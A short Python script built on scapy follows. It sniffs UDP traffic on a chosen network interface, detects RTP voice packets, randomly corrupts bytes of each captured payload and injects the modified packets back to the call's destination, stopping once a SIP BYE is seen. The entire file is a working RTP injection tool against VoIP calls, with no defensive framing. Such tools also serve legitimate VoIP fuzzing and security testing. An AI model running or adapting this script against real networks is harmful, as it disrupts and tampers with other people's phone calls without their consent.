from scapy.all import sniff, IP, UDP, Raw, send, get_if_addr
import random
import time
import psutil

# Global flag for stopping injection
stop_injection = False
rtp_started = False  # Flag to track whether RTP injection has started

# Function to list network interfaces
def list_interfaces():
    interfaces = []
    print("\nAvailable Network Interfaces:")
    for idx, (name, addrs) in enumerate(psutil.net_if_addrs().items()):
        print(f"{idx + 1}. {name}")
        interfaces.append(name)
    
    return interfaces

# Prompt user to select network interface
def select_interface():
    interfaces = list_interfaces()
    while True:
        try:
            choice = int(input("Select the network interface (number): ")) - 1
            if 0 <= choice < len(interfaces):
                return interfaces[choice]
            else:
                print("Invalid selection. Try again.")
        except ValueError:
            print("Please enter a valid number.")

network_interface = select_interface()
source_ip = get_if_addr(network_interface)  # IP from the device
source_port = random.randint(1024, 65535)  # Dynamic Port
target_ip = None  # From RTP packte
rtp_flows = {}

def generate_dynamic_payload(payload):
    payload = bytearray(payload)
    # Example: Randomly modify bytes in the payload
    for i in range(12, len(payload), 8):  # Skip RTP header (12 bytes)
        payload[i] = random.randint(0, 255)
    
    return bytes(payload)

def inject_rtp_packet(original_packet):
    global target_ip, stop_injection, rtp_started

    if stop_injection or Raw not in original_packet:
        return  # Stop injecting when flag is set
    
    rtp_started = True  # Set flag to indicate RTP injection has started

    captured_payload = original_packet[Raw].load
    dynamic_payload = generate_dynamic_payload(captured_payload)

    src_ip = original_packet[IP].src
    dst_ip = original_packet[IP].dst
    src_port = original_packet[UDP].sport
    dst_port = original_packet[UDP].dport
    
    # Track RTP flows dynamically
    rtp_flows[(src_ip, dst_ip, src_port, dst_port)] = time.time()
    target_ip = dst_ip

    ip = IP(src=source_ip, dst=target_ip)
    udp = UDP(sport=source_port, dport=dst_port)
    packet = ip / udp / Raw(load=dynamic_payload)
    
    send(packet, verbose=False)
    print(f"Injected modified RTP packet to {target_ip}:{dst_port}")

def packet_callback(packet):
    global stop_injection, rtp_started

    if stop_injection:
        return  # Stop processing packets when flag is set
    
    if UDP in packet and Raw in packet:
        payload = packet[Raw].load

        # Only check for SIP BYE if RTP has already started
        if rtp_started and b"BYE" in payload:
            print("SIP BYE detected. Stopping injection and exiting.")
            stop_injection = True

        rtp_payload_type = payload[1] & 0x7F  # Extract payload type
        if 96 <= rtp_payload_type <= 127:  # Dynamic RTP payload type range
            print(f"Captured RTP packet from {packet[IP].src}:{packet[UDP].sport}")
            inject_rtp_packet(packet)

def start_sniffing():
    print(f"Sniffing for RTP packets on interface {network_interface}...")
    sniff(iface=network_interface, filter="udp", prn=packet_callback, store=False)

if __name__ == "__main__":
    start_sniffing()
